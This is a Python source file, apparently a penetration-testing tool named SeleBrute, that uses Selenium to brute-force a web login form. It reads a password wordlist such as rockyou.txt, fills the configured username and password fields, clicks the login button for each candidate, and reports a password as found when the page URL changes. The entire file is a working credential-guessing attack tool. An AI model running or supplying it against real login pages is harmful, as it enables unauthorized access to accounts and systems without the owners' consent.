#!/usr/bin/env python3

"""
Example usage:

python3 SeleBrute.py \
  --driver-path /home/kali/Downloads/geckodriver \
  --browser "firefox" \
  --url "http://192.168.1.1/index.php" \
  --username "admin" \
  --passwords-file /usr/share/wordlists/rockyou.txt \
  --username-locator-strategy "id" \
  --username-locator-value "fm_usr" \
  --password-locator-strategy "id" \
  --password-locator-value "fm_pwd" \
  --loginbutton-locator-strategy "xpath" \
  --loginbutton-locator-value "//button" \
  --max-attempts 1000 \
  --headless \
"""

import time
import argparse
import sys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

def parse_args():
    parser = argparse.ArgumentParser(
        description="~ Selenium script to brute force a login form ~"
    )
    parser.add_argument("--url", required=True, help="URL of the login page")
    parser.add_argument("--username", required=True, help="Username to try for login")
    parser.add_argument("--passwords-file", required=True,
                        help="Path to file containing a list of passwords")
    parser.add_argument("--browser", default="chrome", choices=["chrome", "firefox"],
                        help="Browser driver to use (default: chrome)")
    parser.add_argument("--driver-path", default=None,
                        help="Path to the WebDriver if it's not in your PATH")
    parser.add_argument("--max-attempts", type=int, default=0,
                        help="Maximum number of password attempts to try (0 means no limit)")
    parser.add_argument("--headless", action="store_true",
                        help="Run the browser in headless mode")
    parser.add_argument("--username-locator-strategy", required=True,
                        choices=["id", "name", "xpath"],
                        help="Locator strategy for the username field (id, name, xpath)")
    parser.add_argument("--username-locator-value", required=True,
                        help="Locator value (string) for the username field") 
    parser.add_argument("--password-locator-strategy", required=True,
                        choices=["id", "name", "xpath"],
                        help="Locator strategy for the password field (id, name, xpath)")
    parser.add_argument("--password-locator-value", required=True,
                        help="Locator value (string) for the password field")
    parser.add_argument("--loginbutton-locator-strategy", required=True,
                        choices=["id", "name", "xpath"],
                        help="Locator strategy for the login button (id, name, xpath)")
    parser.add_argument("--loginbutton-locator-value", required=True,
                        help="Locator value (string) for the login button")
    return parser.parse_args()

def wait_until_element_interactable(driver, by_locator, timeout=10):
    return WebDriverWait(driver, timeout).until(
        EC.element_to_be_clickable(by_locator)
    )

def get_by_locator(strategy, value):
    strategy = strategy.lower()
    if strategy == "id":
        return (By.ID, value)
    elif strategy == "name":
        return (By.NAME, value)
    elif strategy == "xpath":
        return (By.XPATH, value)
    else:
        raise ValueError(f"Unsupported locator strategy: {strategy}")

def create_webdriver(browser, driver_path=None, headless=False):
    if browser == "chrome":
        options = webdriver.ChromeOptions()
        if headless:
            options.add_argument("--headless")
        service = ChromeService(executable_path=driver_path) if driver_path else ChromeService()
        driver = webdriver.Chrome(service=service, options=options)
    elif browser == "firefox":
        options = webdriver.FirefoxOptions()
        if headless:
            options.add_argument("--headless")
        service = FirefoxService(executable_path=driver_path) if driver_path else FirefoxService()
        driver = webdriver.Firefox(service=service, options=options)
    else:
        raise ValueError("Unsupported browser specified.")
    return driver

def main():
    args = parse_args()

    # 1. Prepare the list of passwords
    with open(args.passwords_file, "r", encoding="latin-1", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    if args.max_attempts > 0 and args.max_attempts < len(passwords):
        passwords = passwords[:args.max_attempts]

    # 2. Create the WebDriver
    driver = create_webdriver(args.browser, args.driver_path, headless=args.headless)

    # 3. Build the locator tuples for the username, password, and login button
    username_locator = get_by_locator(args.username_locator_strategy, args.username_locator_value)
    password_locator = get_by_locator(args.password_locator_strategy, args.password_locator_value)
    loginbutton_locator = get_by_locator(args.loginbutton_locator_strategy, args.loginbutton_locator_value)

    try:
        driver.maximize_window()
        driver.get(args.url)

        # 4. Attempt each password
        for idx, pwd in enumerate(passwords, start=1):
            sys.stdout.write('\r' + ' ' * 80)           
            sys.stdout.write(f"\r[{idx}/{len(passwords)}] Trying: {args.username}:{pwd}")  # print new text
            sys.stdout.flush()
                
            # Locate fields + wait until username field is interactable 
            username_field = wait_until_element_interactable(driver, username_locator, 10)
            password_field = driver.find_element(*password_locator)

            # Clear existing text
            username_field.clear()
            password_field.clear()

            # Enter the username and password
            username_field.send_keys(args.username)
            password_field.send_keys(pwd)

            # Click login button
            login_button = driver.find_element(*loginbutton_locator)
            login_button.click()

            # Wait for page to respond
            WebDriverWait(driver, 10).until(
                lambda d: d.execute_script("return document.readyState") == "complete"
            )
            
            # Check if URL has changed for successful login
            if (driver.current_url != args.url):
                print(f"\n[+] Login SUCCESS with password: {pwd}")
                break 

    finally:
        driver.quit()

if __name__ == "__main__":
    main()
